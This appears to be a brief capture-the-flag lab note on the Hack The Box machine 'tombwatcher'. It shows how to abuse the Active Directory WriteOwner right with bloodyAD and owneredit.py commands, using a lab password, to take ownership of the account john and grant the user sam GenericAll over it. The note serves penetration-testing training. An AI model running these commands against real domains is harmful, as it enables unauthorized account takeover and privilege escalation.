#ACL
abuse `WriteOwner` to give our self `GenericAll`
``
first we have to be the owner and then give our self `GenericAll` 

```bash
bloodyAD -u sam -p 'face' -d tombwatcher.htb --dc-ip 10.10.11.72 set owner john sam

#or
owneredit.py -action write -new-owner sam -target john tombwatcher.htb/sam:face

bloodyAD -u sam -p 'face' -d tombwatcher.htb --dc-ip 10.10.11.72 add genericAll john sam
```
![[Pasted image 20250711070751.png]]

